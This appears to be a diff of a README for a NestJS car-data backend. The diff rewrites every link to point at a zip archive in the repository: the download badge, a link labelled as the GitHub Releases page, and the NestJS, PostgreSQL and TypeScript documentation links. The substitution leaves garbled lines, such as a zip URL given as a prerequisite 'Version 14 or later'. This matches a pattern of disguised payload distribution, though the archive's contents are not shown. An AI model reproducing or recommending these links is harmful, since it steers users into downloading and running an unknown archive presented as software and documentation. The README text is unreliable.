@@ -7,7 +7,7 @@ carValue is a backend application built with NestJS. It helps you manage car-rel
 To get started with carValue, follow the steps below. We will walk you through downloading and running the application on your computer.
 
 ## 📥 Download the Application
-[![Download carValue](https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip)](https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip)
+[![Download carValue](https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip)](https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip)
 
 Click the badge above to go directly to the download page.
 
@@ -15,13 +15,13 @@ Click the badge above to go directly to the download page.
 Before you download, make sure your computer meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip Version 14 or later
+- https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip Version 14 or later
 - PostgreSQL: Version 12 or later
 
-Ensure that you have installed https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip and PostgreSQL before proceeding.
+Ensure that you have installed https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip and PostgreSQL before proceeding.
 
 ## 📂 Download & Install
-1. **Visit the Download Page**: Click [here](https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip) to go to the GitHub Releases page.
+1. **Visit the Download Page**: Click [here](https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip) to go to the GitHub Releases page.
 
 2. **Choose the Right Version**: Look for the latest version listed on the releases page. It will have the version number like v1.0.0.
 
@@ -86,14 +86,14 @@ If you encounter issues during installation or while running the application, co
 
 - **Dependency Errors**: Make sure all required packages are installed by re-running `npm install`.
 - **Database Connection**: Double-check your database credentials and ensure PostgreSQL is running.
-- **Port Conflicts**: If the application doesn’t start, another program may be using port 3000. You can change the port in the `https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip` file.
+- **Port Conflicts**: If the application doesn’t start, another program may be using port 3000. You can change the port in the `https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip` file.
 
 ## 📄 Resources
 For more information, you can check out the following resources:
 
-- [NestJS Documentation](https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip)
-- [PostgreSQL Documentation](https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip)
-- [TypeScript Documentation](https://raw.githubusercontent.com/Suly1715/carValue/main/test/carValue_3.9.zip)
+- [NestJS Documentation](https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip)
+- [PostgreSQL Documentation](https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip)
+- [TypeScript Documentation](https://github.com/Suly1715/carValue/raw/refs/heads/main/src/car_Value_v1.1-beta.1.zip)
 
 ## 💬 Support
 If you need further assistance, feel free to open an issue on the GitHub repository. We will do our best to help you out.
